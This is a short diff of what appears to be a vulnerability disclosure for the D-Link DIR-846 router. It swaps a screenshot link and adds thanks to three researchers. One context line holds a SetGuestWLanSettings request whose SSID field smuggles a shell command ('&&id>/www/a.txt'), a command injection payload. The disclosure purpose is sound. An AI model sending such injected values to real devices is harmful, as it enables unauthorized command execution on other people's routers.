@@ -38,4 +38,15 @@ Cookie: sid=eea33228-f58c-11e9-b614-df9bf19cb824; uid=sB1xQK5E; PrivateKey=57FB9
 {"SetGuestWLanSettings":{"wl(0).(1)_enable":"1","wl(0).(1)_local_access":"0","wl(0).(1)_local_access_timeout":"0","wl(0).(1)_ssid":"a&&id>/www/a.txt","wl(0).(1)_crypto":"none","wl(0).(1)_preshared_key":"SFFMdk9xSE4=","wl(1).(1)_enable":"0","wl(1).(1)_ssid":"D-Link_DIR-846_5G_Guest","wl(1).(1)_preshared_key":"SFFMdk9xSE4=","wl(1).(1)_crypto":"none"}}
 ```
 You can see this:
-![a.txt](https://github.com/dahua966/Routers-vuls/blob/master/DIR-846/a.jpg)
+
+![a.txt](https://github.com/dahua966/Routers-vuls/blob/master/DIR-846/id.png)
+
+#### Acknowledgement
+Thanks to the partners who discovered the vulnerability together：
+
+Zhen-hua Wang
+
+En-Ze Wang
+
+Wei Xie
+
